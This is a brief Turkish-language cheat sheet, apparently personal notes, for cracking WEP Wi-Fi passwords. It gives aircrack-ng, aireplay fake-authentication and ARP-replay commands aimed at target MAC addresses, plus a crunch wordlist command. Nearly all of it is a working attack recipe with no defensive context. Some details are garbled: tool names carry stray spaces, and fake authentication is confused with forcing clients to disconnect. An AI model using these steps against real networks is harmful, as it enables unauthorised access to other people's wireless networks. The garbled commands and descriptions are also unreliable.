# WEB Şifre Kırma
```aircrack -ng airodumptest.cap``` (Tarama Sırasında Yazdırdığımız Dosya)

### Fakeauth saldırısı yapıyoruz ağdan birisi düşüp tekrar bağlanırsa handshake yakalamamız kolaylaşır
```aireplay -ng --fakeauth 0 -a XX:XX:XX:XX:XX:XX -h YY:YY:YY:YY:YY:YY wlan0mon```

```aireplay -ng --arpreplay -b XX:XX:XX:XX:XX:xX -h YY:YY:YY:YY:YY:YY wlan0mon``` belirlenen cihaza IV yollamamızı sağlar

**192.168.1.1** modeminizin ara yüzüne giriş yaparsınız










# Wordlist Oluşturma
``` crunch 6 10 0123456789abcdefgh -o passwrd.txt``` içinde "0123456789abcdefgh" geçen min 6 maks 10
haneli şifre kombinasyonlarının olduğu wordlist oluşturur






## Eğer Ağda Yeteri Kadar Cihaz Yoksa
* fakeauuth yolla
* arpreplay çalıştır
* aircrack -ng çalıştır
